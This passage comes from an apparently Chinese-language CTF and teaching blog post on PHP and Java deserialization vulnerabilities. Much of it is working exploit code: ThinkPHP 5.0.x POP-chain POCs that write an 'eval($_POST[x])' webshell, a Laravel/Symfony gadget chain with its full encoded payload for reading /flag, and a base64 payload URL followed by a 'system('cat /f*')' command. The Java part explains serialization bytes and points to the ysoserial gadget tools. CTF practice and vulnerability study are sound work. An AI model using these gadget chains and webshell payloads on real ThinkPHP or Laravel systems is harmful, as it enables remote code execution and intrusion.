class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $handler = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler=<span class="keyword">new</span> File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Output类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $styles = [<span class="string">'removeWhereField'</span>];</span><br><span class="line">    <span class="keyword">private</span> $handle = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle=<span class="keyword">new</span> Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HasOne类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $query = <span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query=<span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Pivot类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [<span class="string">'getError'</span>];</span><br><span class="line">    <span class="keyword">protected</span> $error = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error=<span class="keyword">new</span> HasOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Windows类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$x=<span class="keyword">new</span> Windows();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($x));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(iconv(<span class="string">"UCS-2BE"</span>, <span class="string">"UCS-2LE"</span>, <span class="string">'&lt;?php eval($_POST[x]);?&gt;'</span>));</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a><strong>[CISCN2019 总决赛 Day1 Web4]Laravel1</strong></h3><p>题目转载：<a href="https://my.oschina.net/u/4258824/blog/3398614" target="_blank" rel="noopener">https://my.oschina.net/u/4258824/blog/3398614</a></p><ol><li>首先全局搜索__destruct这样的魔术方法</li><li>看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类</li><li>然后全局搜索能利用的可控函数</li></ol><p>题目：<a href="http://10.20.25.44:581/" target="_blank" rel="noopener">http://10.20.25.44:581/</a> laravel，构造 rop 拿到 /flag 内容</p><p><img src="http://qiniuyun.lintstar.top/20200806163533.png" alt="20200806163533"></p><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>; <span class="comment">//这里是要访问的目录/etc/passwd</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'aaa'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意这里GET的参数是payload<br>payload</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.25.44:581/?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bs%3A3%3A%22aaa%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A0%3A%7B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%22%3A1%3A%7Bs%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CPhpArrayAdapter%00file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200806163340.png" alt="20200806163340"></p><h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><h2 id="Java语言概述"><a href="#Java语言概述" class="headerlink" title="Java语言概述"></a>Java语言概述</h2><p>Java是一种广泛使用的计算机编程语言，拥有<strong>跨平台、面向对象、泛型编程</strong>的特性，广泛应用于企业级Web应用开发和移动应用开发。</p><p>Java编程语言的风格十分接近C++语言。<strong>继承</strong>了C++语言面向对象技术的核心，舍弃了容易引起错误的指针，以引用取代；<strong>移除</strong>了C++中的运算符重载和多重继承特性，用接口取代；增加垃圾回收器功能。在JavaSE1.5版本中引入了<strong>泛型编程、类型安全的枚举、不定长参数和自动装/拆箱特性。</strong></p><p><strong>一句话：取其精华，弃其糟粕。</strong></p><h2 id="Java中的序列化与反序列化"><a href="#Java中的序列化与反序列化" class="headerlink" title="Java中的序列化与反序列化"></a>Java中的序列化与反序列化</h2><p>Java 序列化是指把 Java 对象转换为字节序列的过程<br>ObjectOutputStream类的 writeObject() 方法可以实现序列化</p><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程<br>ObjectInputStream 类的 readObject() 方法用于反序列化。</p><p>实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的<br>(用transient关键字修饰的属性除外，不参与序列化过程)</p><h3 id="Step1-定义一个类"><a href="#Step1-定义一个类" class="headerlink" title="Step1:定义一个类"></a>Step1:定义一个类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DASCTF</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>; <span class="comment">//序列化版本号</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DASCTF</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="Step2-定义一个DASCTF的类对象"><a href="#Step2-定义一个DASCTF的类对象" class="headerlink" title="Step2:定义一个DASCTF的类对象"></a>Step2:定义一个DASCTF的类对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        DASCTF dasctf = <span class="keyword">new</span> DASCTF( name:<span class="string">"anheng"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Step3-将其序列化之后写出到文件"><a href="#Step3-将其序列化之后写出到文件" class="headerlink" title="Step3:将其序列化之后写出到文件"></a>Step3:将其序列化之后写出到文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(name:<span class="string">"object.txt));</span></span><br><span class="line"><span class="string">    oos.writeObject(dasctf);</span></span><br><span class="line"><span class="string">&#125; catch (IOException e)&#123;</span></span><br><span class="line"><span class="string">    e.printStackTrace();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Step4-将其从文件中读出再做反序列化，并获取其中的name输出"><a href="#Step4-将其从文件中读出再做反序列化，并获取其中的name输出" class="headerlink" title="Step4:将其从文件中读出再做反序列化，并获取其中的name输出"></a>Step4:将其从文件中读出再做反序列化，并获取其中的name输出</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    ObjectOutputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(name:<span class="string">"object.txt));</span></span><br><span class="line"><span class="string">    DASCTF dasctf1 = (DASCTF) ois.readObject();</span></span><br><span class="line"><span class="string">    System.out.println(dasctf1.getName());</span></span><br><span class="line"><span class="string">&#125; catch (IOException e)&#123;</span></span><br><span class="line"><span class="string">    e.printStackTrace();</span></span><br><span class="line"><span class="string">&#125; catch (ClassNotFoundException e)&#123;</span></span><br><span class="line"><span class="string">    e.printStackTrace();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="序列化版本号"><a href="#序列化版本号" class="headerlink" title="序列化版本号"></a>序列化版本号</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DASCTF1</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>; <span class="comment">//序列化版本号</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DASCTF</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用十六进制编辑器打开生成的Object.txt进行序列化数据观察</p><p><img src="http://qiniuyun.lintstar.top/20200806165503.png" alt="20200806165503"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ACED--幻数</span><br><span class="line">0005–Java序列化版本号</span><br><span class="line">73–定义新对象</span><br><span class="line">72–开始类的描述</span><br><span class="line">0006–类名长度（字节数）</span><br><span class="line">444153435446--类名（DASCTF）</span><br><span class="line">0000000000000001–类序列化版本号</span><br><span class="line">02–标识类实现了Serializable</span><br><span class="line">0001–类的属性个数（1个）</span><br><span class="line">4C–对象（TypeCode=‘L‘，引用类型）</span><br><span class="line">0004–字段名长度</span><br><span class="line">6E616D65–字段名数据（name）</span><br><span class="line">74–TC_STRING</span><br><span class="line">0012–字段名长度</span><br><span class="line">4C6A6176612F6C616E672F5374</span><br><span class="line">72696E673B--Ljava/lang/String;</span><br><span class="line">78–数据块结束</span><br><span class="line">70--TC_NULL，输出了一个NULL数据，告知结束，需要开始输出具体数据</span><br><span class="line">74–引用类型，TC_STRING，下面为String数据</span><br><span class="line">0006–String长度6字节</span><br><span class="line">676C7A6A696E--glzjin</span><br></pre></td></tr></table></figure><h3 id="Java中的相关函数"><a href="#Java中的相关函数" class="headerlink" title="Java中的相关函数"></a>Java中的相关函数</h3><p><strong>1. readObject()方法</strong></p><p>readObject 被重写的话，在反序列化时会被调用</p><p><strong>2. 反射创建类对象与调用方法</strong></p><p><strong>3. 反射调用 Runtime exec 执行命令</strong></p><h3 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h3><p>在 Java 中：</p><ul><li><strong>对于任意一个类：</strong><ul><li>都能够得到这个类的所有属性和方法。</li></ul></li><li><strong>对于任意一个对象：</strong><ul><li>都能够获得这个对象所有属性以及调用这个对象的任意方法。</li></ul></li><li><strong>这种动态获取类/对象信息以及动态调用方法的功能叫做 Java 的反射机制。</strong></li></ul><h3 id="Java-反序列化漏洞-关键点"><a href="#Java-反序列化漏洞-关键点" class="headerlink" title="Java 反序列化漏洞-关键点"></a>Java 反序列化漏洞-关键点</h3><ul><li><strong>找到 反序列化数据输入点</strong></li><li><strong>找到 反射调用任意类的点</strong></li><li><strong>找到 从输入点到反射点的链条</strong></li></ul><h3 id="JAVA-Apache-CommonsCollections3-1-反序列化RCE漏洞分析"><a href="#JAVA-Apache-CommonsCollections3-1-反序列化RCE漏洞分析" class="headerlink" title="JAVA Apache-CommonsCollections3.1 反序列化RCE漏洞分析"></a><strong>JAVA Apache-CommonsCollections3.1 反序列化RCE漏洞分析</strong></h3><p>该漏洞组件下载地址<br><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p><p>转载：<a href="https://xz.aliyun.com/t/6787#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6787#toc-10</a></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191117232015-c17d821a-094d-1.png" alt="img"></p><p>JDK1.8+中禁止了链条某些类被反序列化，有一套Java反序列化Payload收集以及生成工具，利用其中CommonsCollections5/6/7即可在高版本中进行反序列化。</p><p>地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><h3 id="Java反序列化漏洞的反序列化点"><a href="#Java反序列化漏洞的反序列化点" class="headerlink" title="Java反序列化漏洞的反序列化点"></a>Java反序列化漏洞的反序列化点</h3><p>除了链条和反射点，我们还要有反序列化点。<br>常出现在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- HTTP参数中</span><br><span class="line">    - Cookie：Shiro</span><br><span class="line">- RMI协议：Java远程方法调用，在RMI中传输的数据皆为序列化</span><br><span class="line">- JMX：一个为应用程序植入管理功能的框架</span><br><span class="line">- 自定义协议：用来接收与发送原始的java对象</span><br><span class="line">    - Dubbo</span><br></pre></td></tr></table></figure><h1 id="反序列化漏洞实战"><a href="#反序列化漏洞实战" class="headerlink" title="反序列化漏洞实战"></a>反序列化漏洞实战</h1><h2 id="PHP反序列化漏洞-2"><a href="#PHP反序列化漏洞-2" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="ThinkPHP-V5-0-24反序列化漏洞-1"><a href="#ThinkPHP-V5-0-24反序列化漏洞-1" class="headerlink" title="ThinkPHP V5.0.24反序列化漏洞"></a><strong>ThinkPHP V5.0.24反序列化漏洞</strong></h3><p>代码包：<a href="https://wws.lanzous.com/ij0LMfcld0b" target="_blank" rel="noopener">https://wws.lanzous.com/ij0LMfcld0b</a></p><p>ThinkPHP 5.0.24 反序列化RCE （Windows下EXP）<br>转载：<a href="https://www.cnblogs.com/xiaozhiru/p/12452528.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozhiru/p/12452528.html</a></p><p>运行POC后会生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.20.25.44:580/?a=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czoyOiJiYiI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6MTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjE2OiJyZW1vdmVXaGVyZUZpZWxkIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjM1OiJQRDl3YUhBS1pYWmhiQ2drWDBkRlZGc25ZU2RkS1RzS1B6NCI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NDY6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9Li8iO319fX19fX19fQ==</span><br></pre></td></tr></table></figure><p>访问<code>http://10.20.25.44:580/8fba8bb6410a4aee90b063a8b7e78b73.php?a=system(&#39;cat /f*&#39;);</code>得到flag</p><p>另一个poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//File类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="comment">// tag变量跟文件名有关</span></span><br><span class="line">    <span class="keyword">protected</span> $tag=<span class="string">'abcdef'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $options = [</span><br><span class="line">        <span class="string">'expire'</span>        =&gt; <span class="number">3600</span>,</span><br><span class="line">        <span class="string">'cache_subdir'</span>  =&gt; <span class="keyword">false</span>,</span><br><span class="line">        <span class="string">'prefix'</span>        =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 写入文件</span></span><br><span class="line">        <span class="string">'path'</span>          =&gt; <span class="string">'php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=.//static/?&lt;hp pvela$(P_SO[T]x;)&gt;?/../'</span>,</span><br><span class="line">        <span class="comment">// 创建子目录</span></span><br><span class="line"><span class="comment">//        'path'       =&gt; './static/runtime/',</span></span><br><span class="line">        <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Memcached类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $handler = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler=<span class="keyword">new</span> File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Output类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $styles = [<span class="string">'removeWhereField'</span>];</span><br><span class="line">    <span class="keyword">private</span> $handle = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle=<span class="keyword">new</span> Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HasOne类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $query = <span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;query=<span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Pivot类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span 